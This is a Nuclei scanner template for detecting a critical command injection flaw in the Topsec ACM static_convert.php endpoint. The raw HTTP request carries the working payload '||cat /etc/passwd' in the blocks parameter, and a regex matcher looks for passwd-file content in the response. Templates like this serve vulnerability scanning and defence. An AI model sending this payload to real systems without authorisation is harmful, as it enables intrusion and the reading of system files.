id: topsec-acm-static-convert-blocks-rce

info:
  name: Topsec ACM Static Convert Blocks RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Exploits a command injection vulnerability in the Topsec ACM static_convert.php endpoint.
  reference:
    - https://planet.vulbox.com/detail/MTA4NDg=

http:
  - raw:
      - |
        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
        part: body
